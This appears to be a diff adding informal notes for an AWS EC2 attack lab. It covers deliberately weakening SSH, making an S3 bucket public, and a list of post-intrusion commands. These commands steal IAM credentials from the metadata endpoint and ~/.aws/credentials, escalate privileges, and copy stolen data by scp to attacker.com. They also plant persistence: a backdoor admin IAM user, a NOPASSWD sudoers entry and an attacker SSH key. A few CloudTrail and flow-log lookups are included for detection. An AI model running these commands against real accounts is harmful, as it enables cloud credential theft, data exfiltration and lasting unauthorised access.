@@ -1,0 +1,80 @@
+aws ec2 ceration
+making ec2 vulnerable
+below actions to make it vul
+
+Edit the SSH configuration file:
+
+sudo nano /etc/ssh/sshd_config
+
+Change the following settings:
+
+PermitRootLogin yes    # Allows direct root login (insecure)
+PasswordAuthentication yes  # Allows password-based login (insecure)
+change root password to easy one
+one apache server installed with document file contains sensitive info
+
+cloud trail logs captured (log.txt)
+
+useful commands after succesful intrusion (sphear phising or any other social eng)
+--------------
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+aws iam list-attached-role-policies --role-name <Role-Name>
+cat ~/.aws/credentials
+aws iam get-user
+aws iam list-attached-user-policies --user-name <user-name>
+aws iam create-policy --policy-name PrivEscPolicy --policy-document file://priv_esc.json
+aws iam attach-user-policy --policy-arn <PolicyARN> --user-name <user-name>
+aws s3 ls
+aws s3 sync s3://vulnerable-bucket-lab/ .
+scp -i lab-key.pem stolen-data.zip attacker@attacker.com:/var/www/html
+aws iam create-user --user-name backdoor-user
+
+
+Attach administrative permissions
+aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+CloudTrail Logs (Track API Calls)
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser
+
+CloudWatch Logs (Monitor EC2 & IAM Activity)
+aws logs describe-log-groups
+
+VPC Flow Logs (Detect Data Exfiltration)
+aws ec2 describe-flow-logs
+
+
+Create an S3 bucket (from your AWS account):
+aws s3 mb s3://vulnerable-bucket-lab
+
+echo "This is a secret document" > secret.txt
+aws s3 cp secret.txt s3://vulnerable-bucket-lab/
+
+Make the bucket publicly accessible:
+
+aws s3api put-bucket-policy --bucket vulnerable-bucket-lab --policy '{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "s3:GetObject",
+            "Resource": "arn:aws:s3:::vulnerable-bucket-lab/*"
+        }
+    ]
+}'
+-------------------------------------
+Attack Execution
+On the compromised Ubuntu machine, create a new user:
+
+sudo useradd -m attacker
+sudo passwd attacker
+
+Grant root access via sudoers:
+
+echo "attacker ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
+
+Add the attacker’s SSH key for remote access:
+mkdir /home/attacker/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABI..." > /home/attacker/.ssh/authorized_keys
+chmod 600 /home/attacker/.ssh/authorized_keys
+
